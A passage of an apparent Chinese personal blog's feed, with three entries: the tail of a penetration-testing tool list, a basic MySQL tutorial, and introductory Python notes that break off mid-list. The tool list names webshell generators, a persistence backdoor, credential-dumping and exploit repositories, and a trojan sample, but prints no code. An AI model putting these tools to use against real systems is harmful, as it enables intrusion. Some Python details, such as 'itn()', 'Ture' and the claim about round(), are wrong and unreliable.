fenghuangscanner 扫描内网中弱口令，LDAP、SMB、redis、MSSQL等&lt;&#x2F;p&gt;
&lt;p&gt;长亭&lt;&#x2F;p&gt;
&lt;p&gt;xray 漏洞利用框架&lt;&#x2F;p&gt;
&lt;p&gt;weevely webshell生成和管理工具 webshell-venom 生成免杀webshell Vegile 持久化控制的工具，不死后门，杀死再生&lt;&#x2F;p&gt;
&lt;p&gt;RedGhost 支持各种语言的反向shell、sudo inject、contab、提权
https:&#x2F;&#x2F;github.com&#x2F;EnableSecurity&#x2F;wafw00f waf检测
https:&#x2F;&#x2F;github.com&#x2F;sowish&#x2F;LNScan 内网信息搜集
https:&#x2F;&#x2F;github.com&#x2F;gentilkiwi&#x2F;mimikatz mimikatz明文注入
https:&#x2F;&#x2F;github.com&#x2F;danielmiessler&#x2F;SecLists payload 合集
https:&#x2F;&#x2F;github.com&#x2F;tennc&#x2F;webshell webshell合集
https:&#x2F;&#x2F;github.com&#x2F;brianwrf&#x2F;hackUtils 各种脚本合集
snort 入侵检测工具 LogonTracer Windows日志分析工具 ModSecurity WAF防火墙
honeyd 蜜罐
ufw 防火墙
keepass 、1password密码管理工具
curl 网络传输命令行工具
LinuxCheck 本地信息搜集
近源渗透测试（社会工程学）
routersploit：专门针对路由设备进行攻击的框架 PRET：打印机利用框架 isf：工控系统利用框架 HomePWN：物联网渗透测								试框架 dronesploit：无人机渗透测试框架 ehtools：Wifi渗透测试框架 jackit：无线键鼠利用 ps1encode：生成恶								意的vba、			cmd、vbs、php、sct、lnk、cfm等多种脚本类型 TheFatRat：快速生成和MSF联动的payload，								可以加壳和exe植入后门，支		持快速替换图标。 &lt;&#x2F;p&gt;
&lt;p&gt;DKMC：将Powershell shellcode存储在图像中，使得图像和powershell均能使用&lt;&#x2F;p&gt;
&lt;p&gt;POC、EXP&lt;&#x2F;p&gt;
&lt;p&gt;ExploitDB官方git版本：&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;offensive-security&#x2F;exploit-database&lt;&#x2F;p&gt;
&lt;p&gt;php漏洞代码分析：&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;80vul&#x2F;phpcodz&lt;&#x2F;p&gt;
&lt;p&gt;CVE-2016-2107:&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;FiloSottile&#x2F;CVE-2016-2107&lt;&#x2F;p&gt;
&lt;p&gt;CVE-2015-7547 POC:&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;fjserna&#x2F;CVE-2015-7547 &lt;&#x2F;p&gt;
&lt;p&gt;JAVA反序列化POC生成工具： &lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;frohoff&#x2F;ysoserial &lt;&#x2F;p&gt;
&lt;p&gt;JAVA反序列化 EXP: &lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;foxglovesec&#x2F;JavaUnserializeExploits &lt;&#x2F;p&gt;
&lt;p&gt;Jenkins CommonCollections EXP: &lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;CaledoniaProject&#x2F;jenkins-cli-exploit &lt;&#x2F;p&gt;
&lt;p&gt;CVE-2015-2426 EXP (windows内核提权)：&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;vlad902&#x2F;hacking-team-windows-kernel-lp &lt;&#x2F;p&gt;
&lt;p&gt;use docker to show web attack(php本地文件包含结合phpinfo getshell以及ssrf结合curl的利用演示 )：&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;hxer&#x2F;vulnapp &lt;&#x2F;p&gt;
&lt;p&gt;php7缓存覆写漏洞Demo及相关工具： &lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;GoSecure&#x2F;php7-opcache-override &lt;&#x2F;p&gt;
&lt;p&gt;XcodeGhost木马样本：&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;XcodeGhostSource&#x2F;XcodeGhost &lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;zhuanlan.zhihu.eom&#x2F;p&#x2F;101976280&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.t00ls.net&#x2F;pytools.html&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>SQL</title>
		<published>2020-08-28T00:00:00+00:00</published>
		<updated>2020-08-28T00:00:00+00:00</updated>
		<link href="https://baz.ee/sql/" type="text/html"/>
		<id>https://baz.ee/sql/</id>
		<content type="html">&lt;p&gt;SQL基础&lt;&#x2F;p&gt;
&lt;p&gt;数据库：就是保存数据的仓库，他是长期存储在计算机内，可共享的数据结合&lt;&#x2F;p&gt;
&lt;p&gt;数据库分类：层次型数据库、网络式数据库、关系型数据库&lt;&#x2F;p&gt;
&lt;p&gt;最常见的数据库模型：关系型数据库、非关系型数据库&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;关系型数据库：&lt;&#x2F;p&gt;
&lt;p&gt;表中的行列次序不重要&lt;&#x2F;p&gt;
&lt;p&gt;行row：表中的行，我们称为一条记录&lt;&#x2F;p&gt;
&lt;p&gt;列column：表中的列，称为属性、字段、field域&lt;&#x2F;p&gt;
&lt;p&gt;主键primary key：用于唯一确认一个记录的字段&lt;&#x2F;p&gt;
&lt;p&gt;域domain：属性的取值范围&lt;&#x2F;p&gt;
&lt;p&gt;常见的关系型数据库&lt;&#x2F;p&gt;
&lt;p&gt;MySQL 中型数据库  免费&lt;&#x2F;p&gt;
&lt;p&gt;Oracle 企业用大型数据库  付费&lt;&#x2F;p&gt;
&lt;p&gt;SQLite&lt;&#x2F;p&gt;
&lt;p&gt;access&lt;&#x2F;p&gt;
&lt;p&gt;SQLserver&lt;&#x2F;p&gt;
&lt;p&gt;数据库架构&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;SQL&#x2F;image-20200828142947181.png&quot; alt=&quot;image-20200828142947181&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;数据库操作：&lt;&#x2F;p&gt;
&lt;p&gt;查看数据库：&lt;&#x2F;p&gt;
&lt;p&gt;show databases;&lt;&#x2F;p&gt;
&lt;p&gt;创建数据库：&lt;&#x2F;p&gt;
&lt;p&gt;create database XXX;&lt;&#x2F;p&gt;
&lt;p&gt;使用数据库：&lt;&#x2F;p&gt;
&lt;p&gt;use XXX;&lt;&#x2F;p&gt;
&lt;p&gt;查看数据表：&lt;&#x2F;p&gt;
&lt;p&gt;show tables;&lt;&#x2F;p&gt;
&lt;p&gt;show columns from + 表名;&lt;&#x2F;p&gt;
&lt;p&gt;查看数据表的详细信息&lt;&#x2F;p&gt;
&lt;p&gt;show table status from +数据库名;&lt;&#x2F;p&gt;
&lt;p&gt;查看数据库版本&lt;&#x2F;p&gt;
&lt;p&gt;select version()；&lt;&#x2F;p&gt;
&lt;p&gt;查看当前使用的数据库&lt;&#x2F;p&gt;
&lt;p&gt;select database();&lt;&#x2F;p&gt;
&lt;p&gt;查看当前用户&lt;&#x2F;p&gt;
&lt;p&gt;select user();&lt;&#x2F;p&gt;
&lt;p&gt;查看数据库路径&lt;&#x2F;p&gt;
&lt;p&gt;select @@datadir;&lt;&#x2F;p&gt;
&lt;p&gt;查看数据库的安装路径&lt;&#x2F;p&gt;
&lt;p&gt;select @@basedir;&lt;&#x2F;p&gt;
&lt;p&gt;查看操作系统版本&lt;&#x2F;p&gt;
&lt;p&gt;select @@version_compile_os;&lt;&#x2F;p&gt;
&lt;p&gt;数据表操作&lt;&#x2F;p&gt;
&lt;p&gt;创建数据表&lt;&#x2F;p&gt;
&lt;p&gt;create table qiuzhi()&lt;&#x2F;p&gt;
&lt;p&gt;create table qiuzhi(&lt;&#x2F;p&gt;
&lt;p&gt;qiuzhi_id int not null auto_increment,&lt;&#x2F;p&gt;
&lt;p&gt;qiuzhi_title varchar(100) not null,&lt;&#x2F;p&gt;
&lt;p&gt;qiuzhi_content varchar(100) not null,&lt;&#x2F;p&gt;
&lt;p&gt;pub_time date,&lt;&#x2F;p&gt;
&lt;p&gt;primary key(qiuzhi_id)&lt;&#x2F;p&gt;
&lt;p&gt;)ENGINE=InnoDB DEFAULT CHARSET=utf8;&lt;&#x2F;p&gt;
&lt;p&gt;查看此数据表&lt;&#x2F;p&gt;
&lt;p&gt;desc qiuzhi;&lt;&#x2F;p&gt;
&lt;p&gt;查看创建此表的配置文件&lt;&#x2F;p&gt;
&lt;p&gt;show create table qiuzhi;&lt;&#x2F;p&gt;
&lt;p&gt;往数据表中增加列&lt;&#x2F;p&gt;
&lt;p&gt;alter table + 表名 add 列名 列类型 列参数 ;&lt;&#x2F;p&gt;
&lt;p&gt;新增加的列默认放在数据表的最后面&lt;&#x2F;p&gt;
&lt;p&gt;alter table + 表名 add 列名 列类型 列参数 first;&lt;&#x2F;p&gt;
&lt;p&gt;alter table qiuzhi add qiuzhi_jieguo varchar(100) not null;&lt;&#x2F;p&gt;
&lt;p&gt;删除列&lt;&#x2F;p&gt;
&lt;p&gt;alter table 表名 drop 列名;&lt;&#x2F;p&gt;
&lt;p&gt;删除数据表&lt;&#x2F;p&gt;
&lt;p&gt;drop table 表名;&lt;&#x2F;p&gt;
&lt;p&gt;读取数据表&lt;&#x2F;p&gt;
&lt;p&gt;select * from 表名；&lt;&#x2F;p&gt;
&lt;p&gt;数据操作&lt;&#x2F;p&gt;
&lt;p&gt;插入数据&lt;&#x2F;p&gt;
&lt;p&gt;insert into 表名(field1,field2,…) values (values1,values2,…)&lt;&#x2F;p&gt;
&lt;p&gt;insert into qiuzhi&lt;&#x2F;p&gt;
&lt;p&gt;(qiuzhi_id,qiuzhi_title,qiuzhi_content,pub_time)&lt;&#x2F;p&gt;
&lt;p&gt;values&lt;&#x2F;p&gt;
&lt;p&gt;(1,’test’,’testtest’,’2020-08-28’);&lt;&#x2F;p&gt;
&lt;p&gt;查询所有数据&lt;&#x2F;p&gt;
&lt;p&gt;select * from 表名;&lt;&#x2F;p&gt;
&lt;p&gt;查询某个数据&lt;&#x2F;p&gt;
&lt;p&gt;select qiuzhi_title from 表名；&lt;&#x2F;p&gt;
&lt;p&gt;条件查询&lt;&#x2F;p&gt;
&lt;p&gt;where操作符&lt;&#x2F;p&gt;
&lt;p&gt;select qiuzhi_content from qiuzhi where qiuzhi_title=&#x27;test&#x27;;&lt;&#x2F;p&gt;
&lt;p&gt;条件模糊查询&lt;&#x2F;p&gt;
&lt;p&gt;like操作符&lt;&#x2F;p&gt;
&lt;p&gt;select * from qiuzhi where qiuzhi_title like &#x27;tes%&#x27;;&lt;&#x2F;p&gt;
&lt;p&gt;更新数据&lt;&#x2F;p&gt;
&lt;p&gt;update qiuzhi set qiuzhi_title=&#x27;test1&#x27; where qiuzhi_id=1;&lt;&#x2F;p&gt;
&lt;p&gt;删除数据&lt;&#x2F;p&gt;
&lt;p&gt;delete from qiuzhi where qiuzhi_id=1;&lt;&#x2F;p&gt;
&lt;p&gt;分组查询&lt;&#x2F;p&gt;
&lt;p&gt;group by操作符&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;SQL&#x2F;clip_image001.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;联合查询&lt;&#x2F;p&gt;
&lt;p&gt;union操作符可以联合多个select查询&lt;&#x2F;p&gt;
&lt;p&gt;select qiuzhi_title from qiuzhi union select pub_time from qiuzhi;&lt;&#x2F;p&gt;
&lt;p&gt;查询后排序&lt;&#x2F;p&gt;
&lt;p&gt;order by&lt;&#x2F;p&gt;
&lt;p&gt;select * from qiuzhi order by pub_time;&lt;&#x2F;p&gt;
&lt;p&gt;insert into user_information&lt;&#x2F;p&gt;
&lt;p&gt;(username,password,add_time)&lt;&#x2F;p&gt;
&lt;p&gt;values&lt;&#x2F;p&gt;
&lt;p&gt;(&#x27;admin&#x27;,&#x27;admin123&#x27;,&#x27;2016-09-24&#x27;);&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Python</title>
		<published>2020-08-27T00:00:00+00:00</published>
		<updated>2020-08-27T00:00:00+00:00</updated>
		<link href="https://baz.ee/python/" type="text/html"/>
		<id>https://baz.ee/python/</id>
		<content type="html">&lt;p&gt;Python简介&lt;&#x2F;p&gt;
&lt;p&gt;1989年圣诞节开始写Python的编译器&lt;&#x2F;p&gt;
&lt;p&gt;1991 2第一个Python编译器诞生&lt;&#x2F;p&gt;
&lt;p&gt;1994 1Python1.0正式发布&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;2000.10.16 Python2.0发布&lt;&#x2F;p&gt;
&lt;p&gt;2008.23.3 Python3.0发布&lt;&#x2F;p&gt;
&lt;p&gt;版本命名&lt;&#x2F;p&gt;
&lt;p&gt;例如3.8.5&lt;&#x2F;p&gt;
&lt;p&gt;3代表大版本号，一般当整体重写或出现不向后兼容的改变时增加&lt;&#x2F;p&gt;
&lt;p&gt;8表示功能更新，出现新功能时增加&lt;&#x2F;p&gt;
&lt;p&gt;5表示小的改动（比如修复bug），只要有修改就增加&lt;&#x2F;p&gt;
&lt;p&gt;Python的优缺点&lt;&#x2F;p&gt;
&lt;p&gt;优点&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;简单和明确，做一件事只有一种方法&lt;&#x2F;li&gt;
&lt;li&gt;学习曲线低，容易上手&lt;&#x2F;li&gt;
&lt;li&gt;开源，有强大的生态圈&lt;&#x2F;li&gt;
&lt;li&gt;解释型编程语言，可跨平台支持&lt;&#x2F;li&gt;
&lt;li&gt;对面向对象编程和函数式编程都提供支持&lt;&#x2F;li&gt;
&lt;li&gt;可扩展性和可嵌入性&lt;&#x2F;li&gt;
&lt;li&gt;代码规范程度高，可读性强&lt;&#x2F;li&gt;
&lt;li&gt;使用者广泛&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;缺点：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;执行效率低&lt;&#x2F;li&gt;
&lt;li&gt;代码无法加密&lt;&#x2F;li&gt;
&lt;li&gt;开发的时候可选择的框架太多&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;应用领域和职位&lt;&#x2F;p&gt;
&lt;p&gt;Python环境搭建&lt;&#x2F;p&gt;
&lt;p&gt;理解程序运行&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Python&#x2F;image-20200817093721456.png&quot; alt=&quot;image-20200817093721456&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;低级语言：
机器型语言：二进制的0和1，CPU内部工作指令，只有硬件才能读懂，灵活、直接执行和速度快&lt;&#x2F;p&gt;
&lt;p&gt;汇编语言：是一种用于电子计算机、微处理器、微控制器或其他可以编程器件的语言，也称为符号语言，用一些容易理解和记忆的字母或单词来代替一个特定的指令，比如用“ADD”来代表数字逻辑上的加减&lt;&#x2F;p&gt;
&lt;p&gt;高级语言：&lt;&#x2F;p&gt;
&lt;p&gt;编译语言：C&#x2F;C++&lt;&#x2F;p&gt;
&lt;p&gt;解释型语言：Python   Ruby   Perl&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Python&#x2F;image-20200817093845728.png&quot; alt=&quot;image-20200817093845728&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;机器语言是二进制执行的，无需翻译过程，CPU可以直接读取。其他语言最终都需统一编译为机器语言执行&lt;&#x2F;p&gt;
&lt;p&gt;汇编语言需要经过一次编译处理，硬件相关无法移植，抽象程度低可读性差，执行效率很高，开发效率很低&lt;&#x2F;p&gt;
&lt;p&gt;编译语言需要一次编译过程，硬件无关可移植，抽象程度高可读性强，执行效率较高，开发效率较高&lt;&#x2F;p&gt;
&lt;p&gt;解释型语言需要经过两次翻译，硬件无关可移植，抽象程度超高，可读性最强，执行效率较低，开发效率最高&lt;&#x2F;p&gt;
&lt;p&gt;Python对象和语言元素&lt;&#x2F;p&gt;
&lt;p&gt;Python的对象&lt;&#x2F;p&gt;
&lt;p&gt;编程的本质便是围绕着“do things”，编程就是”一动一静“&lt;&#x2F;p&gt;
&lt;p&gt;动：解决、处理、执行&lt;&#x2F;p&gt;
&lt;p&gt;静：事情、问题、东西&lt;&#x2F;p&gt;
&lt;p&gt;如何编程？&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;围绕do来做编程，称为面向过程的编程（POP）&lt;&#x2F;li&gt;
&lt;li&gt;围绕thing来做编程，称为面向对象编程（OOP)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Python&#x2F;image-20200817093911944.png&quot; alt=&quot;image-20200817093911944&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;例如：我要好好学python&lt;&#x2F;p&gt;
&lt;p&gt;从面向过程来看：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;收集学习教程：教程   文档    视频&lt;&#x2F;li&gt;
&lt;li&gt;学习语法&lt;&#x2F;li&gt;
&lt;li&gt;项目练手&lt;&#x2F;li&gt;
&lt;li&gt;完成学习&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;从学习流程入手&lt;&#x2F;p&gt;
&lt;p&gt;从面向对象来看：&lt;&#x2F;p&gt;
&lt;p&gt;对象1：我（人）&lt;&#x2F;p&gt;
&lt;p&gt;对象2：python（物）&lt;&#x2F;p&gt;
&lt;p&gt;对象3：学习（教程   视频   文档）&lt;&#x2F;p&gt;
&lt;p&gt;从学习这件事的对象分解开始&lt;&#x2F;p&gt;
&lt;p&gt;什么是对象？&lt;&#x2F;p&gt;
&lt;p&gt;在python中一切皆对象！&lt;&#x2F;p&gt;
&lt;p&gt;python中，能够被处理、被解决的“东西”，都称之为对象（object）&lt;&#x2F;p&gt;
&lt;p&gt;对象有各自的特性和行为&lt;&#x2F;p&gt;
&lt;p&gt;对象的组成&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Python&#x2F;image-20200817093931081.png&quot; alt=&quot;image-20200817093931081&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;对象的特征：&lt;&#x2F;p&gt;
&lt;p&gt;对象的数据、对象的状态，这是一个静态的信息&lt;&#x2F;p&gt;
&lt;p&gt;值 value ：对象表示的数据项&lt;&#x2F;p&gt;
&lt;p&gt;身份ID：唯一的身份标识，是该对象的内存地址，可以用内建id()来查看&lt;&#x2F;p&gt;
&lt;p&gt;类型type：对象的类型决定了该对象可以保存什么类型的值，可以进行什么类型的操作，以及遵循什么规则，可以通过内建函数type()获得&lt;&#x2F;p&gt;
&lt;p&gt;对象的行为：&lt;&#x2F;p&gt;
&lt;p&gt;对象的操作、功能、方法等，是一种动态信息&lt;&#x2F;p&gt;
&lt;p&gt;方法：通过内建函数dir()来获得&lt;&#x2F;p&gt;
&lt;p&gt;例子：人&#x2F;程序员&#x2F;小明&lt;&#x2F;p&gt;
&lt;p&gt;​		   特征：名字   小明   身高 170   体重60kg   年龄18&lt;&#x2F;p&gt;
&lt;p&gt;​		   行为：吃饭   睡觉   学习&lt;&#x2F;p&gt;
&lt;p&gt;对象的类型：&lt;&#x2F;p&gt;
&lt;p&gt;基础对象类型：数字、字符串、列表、元组、字典、集合&lt;&#x2F;p&gt;
&lt;p&gt;进阶对象类型：文件、函数、模块、类&lt;&#x2F;p&gt;
&lt;p&gt;自定义对象类型：类&lt;&#x2F;p&gt;
&lt;p&gt;变量：&lt;&#x2F;p&gt;
&lt;p&gt;在程序设计中，变量是存储数据的载体。&lt;&#x2F;p&gt;
&lt;p&gt;常用的数据类型：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;整型    在python中只有一个int型，支持二进制、八进制、十六进制等表示法&lt;&#x2F;li&gt;
&lt;li&gt;浮点型    除了数学写法（1.23）还支持科学计数法（1.23e2）&lt;&#x2F;li&gt;
&lt;li&gt;字符串型    通过单引号或者双引号括起来的任意文本”hello”&lt;&#x2F;li&gt;
&lt;li&gt;布尔型    Ture    False    也可以通过布尔计算得出布尔值&lt;&#x2F;li&gt;
&lt;li&gt;复数型    与数学上的复数表示一样 3+5j&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;变量的定义：&lt;&#x2F;p&gt;
&lt;p&gt;变量是一种对象的引用，好比一个链接，指向任意的数据&#x2F;对象类型&lt;&#x2F;p&gt;
&lt;p&gt;变量→对象（数字、列表、字符串、元组、字典、集合等）&lt;&#x2F;p&gt;
&lt;p&gt;a=1&lt;&#x2F;p&gt;
&lt;p&gt;变量赋值的原理&lt;&#x2F;p&gt;
&lt;p&gt;第一步：创建内存空间，生成对象（1）&lt;&#x2F;p&gt;
&lt;p&gt;第二步：创建变量，名称为a&lt;&#x2F;p&gt;
&lt;p&gt;第三步：将变量a指向对象1&lt;&#x2F;p&gt;
&lt;p&gt;变量的特征&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;变量在第一次赋值时被创建（内存中）&lt;&#x2F;li&gt;
&lt;li&gt;再次使用该变量时，内存中无需再创建该变量，直接调用。&lt;&#x2F;li&gt;
&lt;li&gt;变量和对象一样，开始的时候不需要进行类型说明&lt;&#x2F;li&gt;
&lt;li&gt;变量在表达式中使用之前必须先赋值&lt;&#x2F;li&gt;
&lt;li&gt;变量在表达式中使用将替换为它们所指向的值&lt;&#x2F;li&gt;
&lt;li&gt;变量如果没有指向一个对象，就会被垃圾回收&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;变量赋值：&lt;&#x2F;p&gt;
&lt;p&gt;赋值语句：var=value&lt;&#x2F;p&gt;
&lt;p&gt;变量命名规则&lt;&#x2F;p&gt;
&lt;p&gt;硬性规则&lt;&#x2F;p&gt;
&lt;p&gt;变量名由字母、数字和下划线构成，数字不能开头。&lt;&#x2F;p&gt;
&lt;p&gt;变量名长度不受限制，不能使用空格、连字符、标点符号、引号或者其他字符&lt;&#x2F;p&gt;
&lt;p&gt;变量对大小写敏感&lt;&#x2F;p&gt;
&lt;p&gt;不能跟关键字、系统保留字冲突&lt;&#x2F;p&gt;
&lt;p&gt;[-5,256]这个范围内的整数（int），python是用一个smallint数组来维护的，这个范围内的int已经在内存空间创建了内存空间地址。超出这个范围，则会在每次声明的时候分别创建内存空间地址。float和tuple同理&lt;&#x2F;p&gt;
&lt;p&gt;在对变量类型进行转换的时候可以使用python的内建函数&lt;&#x2F;p&gt;
&lt;p&gt;itn()将一个数值或者字符转换成整数&lt;&#x2F;p&gt;
&lt;p&gt;float()将一个字符串转换成浮点数&lt;&#x2F;p&gt;
&lt;p&gt;str()将对象转换成该编码对应的字符串&lt;&#x2F;p&gt;
&lt;p&gt;chr()编码转换成字符&lt;&#x2F;p&gt;
&lt;p&gt;ord()将字符转换成编码&lt;&#x2F;p&gt;
&lt;p&gt;运算符&lt;&#x2F;p&gt;
&lt;p&gt;等于==   不等于!=&lt;&#x2F;p&gt;
&lt;p&gt;身份运算符 is is not&lt;&#x2F;p&gt;
&lt;p&gt;成员运算符 in not in&lt;&#x2F;p&gt;
&lt;p&gt;逻辑运算符 and or not&lt;&#x2F;p&gt;
&lt;p&gt;赋值运算符 = += -= *=&lt;&#x2F;p&gt;
&lt;p&gt;指数 **&lt;&#x2F;p&gt;
&lt;p&gt;下标[]  切片[0:2]&lt;&#x2F;p&gt;
&lt;p&gt;运算符优先级&lt;&#x2F;p&gt;
&lt;p&gt;**优先级最高&lt;&#x2F;p&gt;
&lt;p&gt;乘、除、取模、取整、整除次之&lt;&#x2F;p&gt;
&lt;p&gt;加减再次&lt;&#x2F;p&gt;
&lt;p&gt;&#x2F;&amp;gt;&amp;gt;右移   &amp;lt;&amp;lt;左移&lt;&#x2F;p&gt;
&lt;p&gt;^|位运算符&lt;&#x2F;p&gt;
&lt;p&gt;比较运算符&amp;lt;= &amp;lt; &amp;gt; &amp;gt;=&lt;&#x2F;p&gt;
&lt;p&gt;赋值运算符&lt;&#x2F;p&gt;
&lt;p&gt;身份运算符&lt;&#x2F;p&gt;
&lt;p&gt;成员运算符&lt;&#x2F;p&gt;
&lt;p&gt;逻辑运算符&lt;&#x2F;p&gt;
&lt;p&gt;# 通过年份判断是不是闰年（如果是闰年输出True）&lt;&#x2F;p&gt;
&lt;p&gt;# 4的倍数且不是100的倍数 或者 400的倍数&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;year=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;请输入年份&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;runnian=(year%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span&gt;and year%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;100 &lt;&#x2F;span&gt;&lt;span&gt;!=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span&gt;or year%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;400&lt;&#x2F;span&gt;&lt;span&gt;==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(runnian)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Python对象类型之数字&lt;&#x2F;p&gt;
&lt;p&gt;整数：就是我们平常使用最多的数字 1 0 -1&lt;&#x2F;p&gt;
&lt;p&gt;通过进制来区分，分为十进制、八进制（python3:0o）、十六进制（0x）&lt;&#x2F;p&gt;
&lt;p&gt;整数的范围是无穷大，在Python中取决于内存的大小（2**100）&lt;&#x2F;p&gt;
&lt;p&gt;浮点数：就我我们平常使用的小时 10.12&lt;&#x2F;p&gt;
&lt;p&gt;浮点数的范围占8个字节（64比特）正负10的308.25次方&lt;&#x2F;p&gt;
&lt;p&gt;不建议用浮点数做精确计算，会出现误差（计算机在存储数据的时候需要转换成二进制，很多小数转换成二进制是无穷大的，而计算机的存储是有限的，所以需要截取处理）&lt;&#x2F;p&gt;
&lt;p&gt;浮点数计算的时候结果会溢出，整数不会&lt;&#x2F;p&gt;
&lt;p&gt;复数&lt;&#x2F;p&gt;
&lt;p&gt;复数由实部和虚部组成 1+2j&lt;&#x2F;p&gt;
&lt;p&gt;1.1+2.2j&lt;&#x2F;p&gt;
&lt;p&gt;布尔型：&lt;&#x2F;p&gt;
&lt;p&gt;Ture 和 False（首字母必须大写）用于逻辑判断，多用于判断语句中&lt;&#x2F;p&gt;
&lt;p&gt;其他：&lt;&#x2F;p&gt;
&lt;p&gt;分数&lt;&#x2F;p&gt;
&lt;p&gt;空值 None&lt;&#x2F;p&gt;
&lt;p&gt;常量 不变化的量&lt;&#x2F;p&gt;
&lt;p&gt;数字操作运算符&lt;&#x2F;p&gt;
&lt;p&gt;+ - * &#x2F; &#x2F;&#x2F; % ** &lt;&#x2F;p&gt;
&lt;p&gt;== &amp;gt;= &amp;lt;= &amp;lt; &amp;gt; (布尔值)&lt;&#x2F;p&gt;
&lt;p&gt;and or not &lt;&#x2F;p&gt;
&lt;p&gt;数字操作内建函数&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;数值计算函数：&lt;&#x2F;p&gt;
&lt;p&gt;abs()取绝对值；&lt;&#x2F;p&gt;
&lt;p&gt;pow()用于进行指数运算；&lt;&#x2F;p&gt;
&lt;p&gt;round()四舍五入（返回值是整数）round(3.45,1) 1表示保留小数点后一位；&lt;&#x2F;p&gt;
&lt;p&gt;math.floor()向下取整 必须先导入math模块，才能使用math.floor函数；&lt;&#x2F;p&gt;
&lt;p&gt;int()直接截取小数部分（返回的是整数）；&lt;&#x2F;p&gt;
&lt;p&gt;divmod()把除法和取余结合，返回一个包含商和余数的元组divmod(10,3)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
